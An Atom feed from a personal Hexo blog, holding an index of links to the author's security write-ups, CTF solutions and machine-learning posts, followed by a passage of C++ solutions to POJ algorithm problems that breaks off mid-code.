<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-08-08T00:12:47.534Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://yoursite.com/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://yoursite.com/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2017-08-08T00:12:47.534Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Book"><a href="#Book" class="headerlink" title="Book"></a>Book</h1><ul>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="external">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="external">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="external">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/" target="_blank" rel="external">利用PHP的OPcache机制getshell</a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/" target="_blank" rel="external">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h1><ul>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/" target="_blank" rel="external">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/" target="_blank" rel="external">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/" target="_blank" rel="external">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/" target="_blank" rel="external">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/" target="_blank" rel="external">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/" target="_blank" rel="external">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/" target="_blank" rel="external">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/" target="_blank" rel="external">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/" target="_blank" rel="external">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/" target="_blank" rel="external">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/" target="_blank" rel="external">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="external">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/" target="_blank" rel="external"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/" target="_blank" rel="external">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/" target="_blank" rel="external">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/" target="_blank" rel="external">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/" target="_blank" rel="external">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="external">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/" target="_blank" rel="external">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/" target="_blank" rel="external">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/" target="_blank" rel="external">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/" target="_blank" rel="external">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/" target="_blank" rel="external">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/" target="_blank" rel="external">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/" target="_blank" rel="external">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/" target="_blank" rel="external">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/" target="_blank" rel="external">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/" target="_blank" rel="external">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/" target="_blank" rel="external">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/" target="_blank" rel="external">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/" target="_blank" rel="external">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/" target="_blank" rel="external">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/" target="_blank" rel="external">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/" target="_blank" rel="external">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/" target="_blank" rel="external">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/" target="_blank" rel="external">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACM-OJ[长期更新]</title>
    <link href="http://yoursite.com/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
    <id>http://yoursite.com/3017/06/19/ACM-OJ-长期更新/</id>
    <published>3017-06-19T08:40:18.000Z</published>
    <updated>2017-06-21T11:42:49.022Z</updated>
    
    <content type="html"><![CDATA[<p>最近更新日期：2017-06-21<br>干脆把自己平日做的题放在一篇文章里吧。不然太分散了。<br>POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617<br>XOJ: 1004 1005 1022 1061 1062 1075 1078 1316<br><a id="more"></a></p>
<h1 id="POJ"><a href="#POJ" class="headerlink" title="POJ"></a>POJ</h1><h2 id="1163"><a href="#1163" class="headerlink" title="1163"></a>1163</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1163" target="_blank" rel="external">http://poj.org/problem?id=1163</a></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>见下面POJ-3176题分析</p>
<h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 355</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> way[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> triangle[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;triangle[i][j]);</div><div class="line"></div><div class="line">    way[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ( j == <span class="number">0</span> )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( j == i )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j<span class="number">-1</span>] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                way[i][j] = max(way[i<span class="number">-1</span>][j],way[i<span class="number">-1</span>][j<span class="number">-1</span>]) + triangle[i][j];</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    <span class="keyword">int</span> lastrow = n - <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res = way[lastrow][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</div><div class="line">        <span class="keyword">if</span> (way[lastrow][j] &gt; res )</div><div class="line">            res = way[lastrow][j];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1258"><a href="#1258" class="headerlink" title="1258"></a>1258</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1258" target="_blank" rel="external">http://poj.org/problem?id=1258</a></p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>最小生成树。</p>
<h3 id="提交-1"><a href="#提交-1" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 105</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> cost[MAX][MAX] ;</div><div class="line"><span class="keyword">int</span> mincost[MAX];</div><div class="line"><span class="keyword">bool</span> used[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        mincost[i] = INF;</div><div class="line">        used[i] = <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    mincost[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( <span class="literal">true</span> )&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> u = <span class="number">0</span>; u &lt; n; u++)&#123;</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || mincost[u] &lt; mincost[v]))</div><div class="line">                v = u;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( v == <span class="number">-1</span> )</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line">        res += mincost[v];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> u = <span class="number">0</span>; u &lt; n; u++)</div><div class="line">            mincost[u] = min(mincost[u], cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> res;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n) != EOF )&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</div><div class="line">                cost[i][j] = INF;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n ; j++)</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,prim());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1273"><a href="#1273" class="headerlink" title="1273"></a>1273</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1273" target="_blank" rel="external">http://poj.org/problem?id=1273</a></p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>模板题目，直接求最大流就可以。<br>我用了vector来构造邻接表，而这题的输入时一次包含了很多个测试例子。所以每次读完后都需要对邻接表进行初始化，即进行下面的操作：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++ )</div><div class="line">	G[i].clear();</div></pre></td></tr></table></figure></p>
<p>方法是网上找的，网上说这样清空了元素，但不会回收内存。</p>
<h3 id="提交-2"><a href="#提交-2" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"></div><div class="line"><span 